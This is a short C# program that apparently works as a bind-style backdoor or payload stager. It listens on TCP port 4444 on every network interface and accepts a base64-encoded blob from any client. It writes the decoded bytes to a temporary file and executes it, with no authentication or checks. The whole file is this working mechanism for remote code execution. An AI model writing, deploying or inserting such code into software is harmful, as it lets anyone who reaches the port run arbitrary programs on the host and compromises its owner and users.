using System.Diagnostics;
using System.Net.Sockets;

static class Program
{

    static void Main(string[] args)
    {
        TcpListener tc = new TcpListener(System.Net.IPAddress.Any, 4444);
        tc.Start();
        TcpClient tc2 = tc.AcceptTcpClient();
        StreamReader sr = new StreamReader(tc2.GetStream());
        string base64 = sr.ReadLine();//read bas64
        byte[] br = Convert.FromBase64String(base64);
        string temp = Path.GetTempFileName();
        var f = File.Create(temp);//convert it into byte array then write to a temp file
        f.Write(br,0,br.Length);
        f.Close();
        Process.Start(temp);
        Console.ReadKey(true);
    }
}